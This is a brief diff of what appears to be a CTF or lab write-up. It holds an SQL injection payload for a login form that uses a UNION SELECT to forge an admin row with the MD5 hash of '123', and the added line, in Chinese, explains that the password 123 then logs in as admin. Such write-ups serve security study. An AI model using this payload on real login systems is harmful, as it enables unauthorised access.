@@ -40,5 +40,5 @@ if($arr[1] == "admin"){
 ```http
    name=admi'union select 1,'admin','202cb962ac59075b964b07152d234b70'--+&pw=123
 ```
-
+这里是123的md5加密，就是伪造了一个admin的密码，然后密码输入123就好了。
    
